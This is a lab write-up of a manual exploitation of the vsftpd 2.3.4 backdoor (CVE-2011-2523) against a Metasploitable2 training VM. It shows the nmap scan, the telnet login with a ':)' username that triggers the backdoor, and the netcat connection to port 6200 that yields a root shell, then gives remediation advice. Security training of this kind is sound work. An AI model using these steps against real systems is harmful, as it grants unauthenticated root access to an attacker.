# Metasploitable2: vsftpd 2.3.4 Backdoor Exploitation (CVE-2011-2523)

**Author:** Muhammad Shamil KP
**Date:** August 2026
**Lab Environment:** Local VirtualBox lab (Kali Linux attacker + Metasploitable2 target)

---

## 1. Objective

To identify and manually exploit a known backdoor vulnerability in a deliberately vulnerable target machine, demonstrating the full attack methodology: reconnaissance, vulnerability identification, manual exploitation, and privilege confirmation — without relying on automated exploitation frameworks.

## 2. Lab Setup

| Component | Details |
|---|---|
| Attacker machine | Kali Linux (persistent USB install) |
| Target machine | Metasploitable2 (Ubuntu 8.04, intentionally vulnerable) |
| Hypervisor | Oracle VirtualBox 7.x |
| Network | Isolated Host-only network (`vboxnet0`, subnet `192.168.56.0/24`) |
| Attacker IP | `192.168.56.1` (host) |
| Target IP | `192.168.56.101` |

The target was deliberately isolated on a Host-only virtual network with no bridge to the internet or the local LAN, ensuring the vulnerable machine could not be reached by or reach any external system.

## 3. Reconnaissance

An Nmap service/version scan was run against the target to enumerate exposed services:

```bash
nmap -sV 192.168.56.101
```

**Key result:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

Among the 23 open ports identified, port 21 stood out immediately: **vsftpd 2.3.4** is a version with a publicly documented, intentionally-inserted backdoor.

## 4. Vulnerability

**CVE-2011-2523** — Between June 30 and July 1, 2011, the official vsftpd 2.3.4 source archive hosted on the project's master site was maliciously modified by an unknown attacker to include a backdoor. If a client sends a username containing the string `:)` during FTP login, the backdoored binary opens a root shell listening on **TCP port 6200**, regardless of whether authentication succeeds.

This makes it a textbook example of a supply-chain compromise and a common first exploit for learning manual exploitation technique.

## 5. Exploitation Steps

**Step 1 — Trigger the backdoor via FTP login:**

```bash
telnet 192.168.56.101 21
```

```
220 (vsFTPd 2.3.4)
USER hack:)
331 Please specify the password.
PASS anything
Connection closed by foreign host.
```

The connection closing here is expected — the backdoor triggers silently server-side the moment the `:)` sequence is received in the username field, independent of login success.

**Step 2 — Connect to the backdoor listener:**

```bash
nc 192.168.56.101 6200
```

**Step 3 — Confirm access level:**

```bash
whoami
```

**Result:** `root`

Root-level shell access was obtained on the target with no authentication and no exploitation framework — purely by understanding and manually replicating the vulnerability's trigger condition.

## 6. Impact

An attacker exploiting this vulnerability gains unauthenticated, remote root access to the entire system — the highest possible privilege level. This would allow full compromise: data exfiltration, installation of persistent backdoors, lateral movement to other hosts, or use of the machine as a pivot point in a larger network.

## 7. Remediation

- Upgrade vsftpd to a version verified against the official, unmodified source (2.3.5 or later).
- Verify package checksums/signatures against the vendor's published hashes before deployment.
- Monitor for unexpected listening ports (e.g., port 6200) as an indicator of compromise.
- Apply the general principle of only pulling software from verified, signed repositories rather than direct source downloads.

## 8. Lessons Learned

- Reading Nmap **version** output carefully — not just open/closed port state — is what surfaces exploitable, version-specific vulnerabilities.
- Manually replicating an exploit (rather than jumping straight to an automated tool like Metasploit) builds a clearer understanding of *why* an exploit works, not just *that* it works.
- Network isolation (Host-only VirtualBox networking) is essential lab hygiene when working with intentionally vulnerable systems, preventing any accidental exposure to real networks.

---

*This exploitation was performed exclusively in an isolated, personally-owned local lab environment for educational purposes, against Metasploitable2 — a virtual machine explicitly designed and distributed for security training.*
